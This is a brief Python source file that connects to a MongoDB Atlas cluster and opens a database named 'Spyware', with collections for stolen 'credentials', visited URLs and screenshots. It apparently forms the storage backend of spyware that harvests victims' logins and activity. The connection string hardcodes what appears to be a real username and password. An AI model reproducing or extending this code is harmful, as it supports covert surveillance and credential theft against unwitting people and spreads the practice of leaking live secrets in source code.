from pymongo import MongoClient

client = MongoClient('mongodb+srv://shivam:shivam28@project1.kja17z2.mongodb.net/')  # Adjust the URI if using a cloud-based MongoDB
db = client['Spyware']  # Use your database name
credentials = db['credentials']     # Use your collection name
urlsvisited=db['urlvisited']
screenshots = db['screenshots']